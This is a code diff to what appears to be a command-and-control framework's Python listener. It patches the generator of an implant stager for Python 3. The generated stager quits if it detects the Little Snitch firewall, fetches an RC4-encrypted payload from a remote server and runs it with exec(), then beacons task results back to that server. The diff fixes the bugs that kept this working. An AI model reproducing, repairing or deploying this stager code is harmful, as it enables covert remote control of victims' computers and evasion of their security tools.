@@ -497,7 +497,7 @@ class Listener(object):
 
                 # ==== HANDLE IMPORTS ====
                 launcherBase = 'import sys,base64\n'
-                launcherBase += 'import urllib.request as urllib'
+                launcherBase += 'import urllib.request as urllib\n'
 
                 # ==== HANDLE SSL ====
                 if profile.stager.client.scheme == "https":
@@ -510,7 +510,7 @@ class Listener(object):
                     launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
                     launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
                     launcherBase += "out, err = ps.communicate()\n"
-                    launcherBase += "if re.search('Little Snitch', out):sys.exit()\n"
+                    launcherBase += "if re.search('Little Snitch', out.decode()):sys.exit()\n"
 
                 launcherBase += "server='%s'\n" % (host)
 
@@ -544,7 +544,7 @@ class Listener(object):
 
                 # ==== BUILD REQUEST ====
                 launcherBase += "vreq=type('vreq',(urllib.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.Request.get_method(self)})\n"
-                launcherBase += "req=vreq('%s', '%s')\n" % (profile.stager.client.url, profile.stager.client.body)
+                launcherBase += "req=vreq('%s', %s)\n" % (profile.stager.client.url, profile.stager.client.body)
                 launcherBase += "req.verb='"+profile.stager.client.verb+"'\n"
 
                 # ==== ADD HEADERS ====
@@ -582,7 +582,6 @@ class Listener(object):
                 launcherBase += "    j=(j+S[i])%256\n"
                 launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                 launcherBase += "    out.append(chr(char^S[(S[i]+S[j])%256]))\n"
-                launcherBase += "exec(''.join(out))"
 
                 # ==== EXECUTE STAGER ====
                 launcherBase += "exec(''.join(out))"
@@ -1024,7 +1023,7 @@ class Listener(object):
                 sendMessage += "\n".join(["        " + _ for _ in profile.post.client.output.generate_python("routingPacket").split("\n")]) + "\n"
 
                 # ==== CHOOSE URI ====
-                sendMessage += "        taskUri = random.sample("+ profile.post.client.uris +", 1)[0]\n"
+                sendMessage += "        taskUri = random.sample("+ str(profile.post.client.uris) +", 1)[0]\n"
                 sendMessage += "        requestUri = server + taskUri\n"
 
                 # ==== ADD PARAMETERS ====
@@ -1044,6 +1043,7 @@ class Listener(object):
                     sendMessage += "        body = routingPacket\n"
                 else:
                     sendMessage += "        body = '"+profile.post.client.body+"'\n"
+                sendMessage += "        try:\n            body=body.encode()\n        except AttributeError:\n            pass\n"
 
                 # ==== BUILD REQUEST ====
                 sendMessage += "        req = vreq(requestUri, body)\n"
@@ -1063,7 +1063,7 @@ class Listener(object):
                 sendMessage += "\n".join(["        " + _ for _ in profile.get.client.metadata.generate_python("routingPacket").split("\n")]) + "\n"
 
                 # ==== CHOOSE URI ====
-                sendMessage += "        taskUri = random.sample("+ profile.get.client.uris +", 1)[0]\n"
+                sendMessage += "        taskUri = random.sample("+ str(profile.get.client.uris) +", 1)[0]\n"
                 sendMessage += "        requestUri = server + taskUri\n"
 
                 # ==== ADD PARAMETERS ====
